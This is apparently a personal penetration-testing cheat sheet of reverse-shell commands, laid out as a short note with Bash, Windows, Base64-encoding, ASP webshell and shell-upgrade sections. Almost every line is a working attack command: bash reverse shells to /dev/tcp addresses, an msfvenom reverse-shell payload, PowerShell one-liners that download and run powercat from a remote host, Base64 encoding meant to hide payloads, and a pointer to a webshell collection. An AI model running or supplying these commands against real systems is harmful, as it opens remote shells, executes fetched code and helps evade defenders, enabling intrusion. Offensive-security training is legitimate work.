---
sticker: emoji//1f41a
---
#### Shells
##### Bash
```
bash -c "bash -i >& /dev/tcp/192.168.45.161/1443 0>&1"

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

/bin/bash -l > /dev/tcp/192.168.45.161/1443 0<&1 2>&1
```

##### Windows
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>

IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"

```

###### Base64 Encode

```
#PowerShell Script
$Text = "YOUR_PAYLOAD_HERE"

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

#PowerShell Command
powershell -enc "<base64>"
powershell -a "-enc <base64>"
```

##### ASP / ASPX

```
https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
```

#### Upgrades
```
#interactive upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

#interactive upgrade
python3 -c 'import pty; pty.spawn(["env","TERM=xterm-256color","/bin/bash","--rcfile", "/etc/bash.bashrc","-i"])'

#enables clear
export TERM=xterm
```